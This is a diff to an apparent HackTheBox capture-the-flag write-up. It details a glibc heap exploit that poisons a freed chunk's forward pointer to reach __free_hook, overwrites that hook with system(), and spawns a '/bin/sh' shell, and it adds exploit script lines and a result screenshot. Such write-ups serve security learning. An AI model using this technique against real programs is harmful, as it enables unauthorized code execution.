@@ -210,7 +210,7 @@ edit(0, b'M' * 0x28 + p8(0x81)) # overflow chunk 0 until and overlap the size fi
 ### OVERLAP FD POINTER TO __FREE_HOOK() and Overwrite it to system()
 
 - In this condition, the bigger chunk (0x81) can be used to overlap the `FD Pointer` of the chunk at index 2 to `__free_hook()`.
-- At the process of that overlap, we can specify another fake size field to 0x21, this size_field FD is __free_hook().
+- At the process of that overlap, we can specify another fake size field to 0x21 (we overlap size field of chunk index 2), this size_field FD is __free_hook().
 - Then we can start allocate /bin/sh strings with size of 0x28 and allocate system() with size of 0x28.
 - Finally just free chunk index 0, to trigger system"/bin/sh").
 
@@ -219,6 +219,20 @@ edit(0, b'M' * 0x28 + p8(0x81)) # overflow chunk 0 until and overlap the size fi
 ```
 delete chunk index 1
 delete chunk index 2
-allocate 0x78, send pad * 0x28 + pack(0x21) --> for fake size field again + __free_hook() --> for it's FD
+allocate 0x78, send pad * 0x28 + pack(0x21) --> for fake size field again for chunk index 2 + __free_hook() --> for it's FD
 ```
+
+> SCRIPT
+
+```py
+delete(1) # remove data at chunk 1
+delete(2) # remove data at chunk 2
+
+# overlap size field of chunk 2 to 0x21 and change it's FD to __free_hook()
+make(0x78, b'D' * 0x28 + pack(0x21) + pack(libc.sym['__free_hook'])) 
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a1994bff-ef7b-4ee6-bd38-33660ff55af9)
 
